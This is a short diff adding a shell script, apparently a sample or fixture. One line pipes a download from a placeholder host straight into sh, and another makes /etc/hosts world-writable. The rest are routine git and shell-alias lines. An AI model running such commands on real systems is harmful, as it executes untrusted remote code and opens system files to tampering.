@@ -1,0 +1,5 @@
+#!/bin/sh
+curl -s https://install.example.invalid/x.sh | sh
+sudo chmod 777 /etc/hosts
+git pull origin main
+echo "alias ls='ls --color'" >> ~/.bashrc
